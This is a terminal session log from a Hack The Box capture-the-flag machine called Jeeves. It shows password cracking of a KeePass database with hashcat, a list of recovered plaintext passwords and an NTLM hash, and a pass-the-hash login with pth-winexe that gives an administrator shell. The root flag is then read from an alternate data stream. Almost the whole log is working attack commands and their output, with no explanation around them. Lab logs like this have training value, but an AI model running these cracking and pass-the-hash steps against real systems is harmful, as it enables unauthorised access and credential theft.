┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #ls                                    
gobuster5000.out  gobuster.out  nmap  smb  www                                           
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #cd smb/                               
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #ls                                    
awesome                                     
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #cat awesome                           
arrow                                       
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #ls                                    
awesome  CEH.kdbx                           
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #keepass2john CEH.kdbx                 
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48                                           
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #vi jeeves.keepass                     
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #vi jeeves.keepass                     
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #hashcat -m 13400 jeeves.keepass /opt/wordlists/rockyou.txt --force                 
hashcat (v5.1.0) starting...                

OpenCL Platform #1: The pocl project        
====================================        
* Device #1: pthread-Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz, 512/1493 MB allocatable, 2MCU                                                                                      

Hashes: 1 digests; 1 unique digests, 1 unique salts                                      
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates             
Rules: 1                                    

Applicable optimizers:                      
* Zero-Byte                                 
* Single-Hash                               
* Single-Salt                               

Minimum password length supported by kernel: 0                                           
Maximum password length supported by kernel: 256                                         

Watchdog: Hardware monitoring interface not found on your system.                        
Watchdog: Temperature abort trigger disabled.                                            

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13400 -D _unroll'                                                                                      
Dictionary cache hit:                       
* Filename..: /opt/wordlists/rockyou.txt    
* Passwords.: 14344384                      
* Bytes.....: 139921497                     
* Keyspace..: 14344384                      

$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1                                    
                                                                                         
Session..........: hashcat                  
Status...........: Cracked                  
Hash.Type........: KeePass 1 (AES/Twofish) and KeePass 2 (AES)                           
Hash.Target......: $keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea...47db48          
Time.Started.....: Sun Jan  5 00:07:27 2020 (1 min, 32 secs)                             
Time.Estimated...: Sun Jan  5 00:08:59 2020 (0 secs)                                     
Guess.Base.......: File (/opt/wordlists/rockyou.txt)                                     
Guess.Queue......: 1/1 (100.00%)            
Speed.#1.........:      613 H/s (9.02ms) @ Accel:256 Loops:64 Thr:1 Vec:8                
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts                            
Progress.........: 55296/14344384 (0.39%)   
Rejected.........: 0/55296 (0.00%)          
Restore.Point....: 54784/14344384 (0.38%)   
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:5952-6000                              
Candidates.#1....: sc00byd00 -> gonoles     

Started: Sun Jan  5 00:07:05 2020           
Stopped: Sun Jan  5 00:09:00 2020           
┌─[root@parrot]─[~/hackthebox/jeeves/smb]   
└──╼ #cd ..                                 
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #vi creds                              
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #vi passwords                          
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #clear                                 
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #cat passwords                         
administrator : S1TjAtJHKsugh9oC4VZl        
admin : F7WhTrSFDKB6sxHU1cUn                
bob : lCEUnYPjNfIuPZSzOySA                  

?(NTLM hash) : aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00         
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe                          
Enter password:                             
E_md4hash wrapper called.                   
HASH PASS: Substituting user supplied NTLM HASH...                                       
Microsoft Windows [Version 10.0.10586]      
(c) 2015 Microsoft Corporation. All rights reserved.                                     

C:\Windows\system32>cd ../..                
cd ../..                                    

C:\>dir                                     
dir                                         
 Volume in drive C has no label.            
 Volume Serial Number is BE50-B1C9          

 Directory of C:\                           

11/05/2017  09:15 PM    <DIR>          inetpub                                           
11/03/2017  09:33 PM    <DIR>          Jenkins                                           
10/30/2015  02:24 AM    <DIR>          PerfLogs                                          
10/26/2017  02:33 AM    <DIR>          Program Files                                     
11/03/2017  09:26 PM    <DIR>          Program Files (x86)                               
11/08/2017  05:22 PM    <DIR>          Users                                             
12/24/2017  02:53 AM    <DIR>          Windows                                           
11/08/2017  09:05 AM    <DIR>          Windows10Upgrade                                  
               0 File(s)              0 bytes                                            
               8 Dir(s)   7,535,501,312 bytes free                                       

C:\>cd Users                                
cd Users                                    

C:\Users>cd Admins^?i^?^?^?                 
cd Adminsi                                  
The system cannot find the path specified.  

C:\Users>cd Administrator                   
cd Administrator                            

C:\Users\Administrator>cdd^?                
ccdd                                        
'cdd' is not recognized as an internal or external command,                              
operable program or batch file.             
d                                           
C:\Users\Administrator> cd Desktop          
cd cd Desktop                               
The system cannot find the path specified.  

C:\Users\Administrator>dir                  
dir                                         
 Volume in drive C has no label.            
 Volume Serial Number is BE50-B1C9          

 Directory of C:\Users\Administrator        

11/03/2017  10:07 PM    <DIR>          .    
11/03/2017  10:07 PM    <DIR>          ..   
11/03/2017  09:43 PM    <DIR>          .groovy                                           
01/04/2020  07:39 PM    <DIR>          .jenkins                                          
11/03/2017  09:03 PM    <DIR>          Contacts                                          
11/08/2017  09:05 AM    <DIR>          Desktop                                           
11/03/2017  09:03 PM    <DIR>          Documents                                         
11/03/2017  09:33 PM    <DIR>          Downloads                                         
11/03/2017  09:03 PM    <DIR>          Favorites                                         
11/03/2017  09:16 PM    <DIR>          Links                                             
11/03/2017  09:03 PM    <DIR>          Music                                             
11/03/2017  09:16 PM    <DIR>          OneDrive                                          
11/03/2017  09:03 PM    <DIR>          Pictures                                          
11/03/2017  09:03 PM    <DIR>          Saved Games                                       
11/03/2017  09:10 PM    <DIR>          Searches                                          
11/03/2017  09:03 PM    <DIR>          Videos                                            
               0 File(s)              0 bytes                                            
              16 Dir(s)   7,535,501,312 bytes free                                       

C:\Users\Administrator>cd Desktop           
cd Desktop                                  

C:\Users\Administrator\Desktop>dir          
dir                                         
 Volume in drive C has no label.            
 Volume Serial Number is BE50-B1C9          

 Directory of C:\Users\Administrator\Desktop                                             

11/08/2017  09:05 AM    <DIR>          .    
11/08/2017  09:05 AM    <DIR>          ..   
12/24/2017  02:51 AM                36 hm.txt                                            
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk                   
               2 File(s)            833 bytes                                            
               2 Dir(s)   7,535,501,312 bytes free                                       

C:\Users\Administrator\Desktop>cat hm.txt   
cat hm.txt                                  
'cat' is not recognized as an internal or external command,                              
operable program or batch file.             

C:\Users\Administrator\Desktop>type hm.txt  
type hm.txt                                 
The flag is elsewhere.  Look deeper.        
C:\Users\Administrator\Desktop>(Get ^?-Content                                           
(Get -Content                               
More?                                       

More? q                                     
q                                           
More? exit                                  
exit                                        
More?                                       

More? ^Z                                    
[1]+  Stopped                 pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe  
┌─[✗]─[root@parrot]─[~/hackthebox/jeeves]   
└──╼ #pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe                                                  
E_md4hash wrapper called.                   
HASH PASS: Substituting user supplied NTLM HASH...                                       
Microsoft Windows [Version 10.0.10586]      
(c) 2015 Microsoft Corporation. All rights reserved.                                     

C:\Windows\system32>cd /                    
cd /                                        

C:\>cd Users                                
cd Users                                    

C:\Users>cd S                               
cd S                                        
The system cannot find the path specified.  

C:\Users>cd Administrto                     
cd Administrto                              
The system cannot find the path specified.  

C:\Users>cd Administrator                   
cd Administrator                            

C:\Users\Administrator>cd Desktop           
cd Desktop                                  

C:\Users\Administrator\Desktop>(Get-Content hm.txt -Stream root.txt)                     
(Get-Content hm.txt -Stream root.txt)       
'Get-Content' is not recognized as an internal or external command,                      
operable program or batch file.             

C:\Users\Administrator\Desktop>powershell (Get-Content hm.txt -Stream root.txt)          
powershell (Get-Content hm.txt -Stream root.txt)                                         
afbc5bd4b615a60648cec41c6ac92530            

C:\Users\Administrator\Desktop>ls^?         
ls                                          
'ls' is not recognized as an internal or external command,                               
operable program or batch file.             

C:\Users\Administrator\Desktop>more hm.txt  
more hm.txt                                 
The flag is elsewhere.  Look deeper.        

C:\Users\Administrator\Desktop>dir \r       
dir \r                                      
File Not Found                              
 Volume in drive C has no label.            
 Volume Serial Number is BE50-B1C9          

 Directory of C:\                           


C:\Users\Administrator\Desktop>dir /r       
dir /r                                      
 Volume in drive C has no label.            
 Volume Serial Number is BE50-B1C9          

 Directory of C:\Users\Administrator\Desktop                                             

11/08/2017  09:05 AM    <DIR>          .    
11/08/2017  09:05 AM    <DIR>          ..   
12/24/2017  02:51 AM                36 hm.txt                                            
                                    34 hm.txt:root.txt:$DATA                             
11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk                   
               2 File(s)            833 bytes                                            
               2 Dir(s)   7,535,415,296 bytes free                                       

C:\Users\Administrator\Desktop>rm hm.txt    
rm hm.txt                                   
'rm' is not recognized as an internal or external command,                               
operable program or batch file.             

C:\Users\Administrator\Desktop>del hm.txt   
del hm.txt                                  
Access is denied.                           
C:\Users\Administrator\Desktop\hm.txt       

C:\Users\Administrator\Desktop>exit         
exit                                        
┌─[root@parrot]─[~/hackthebox/jeeves]       
└──╼ #                                      
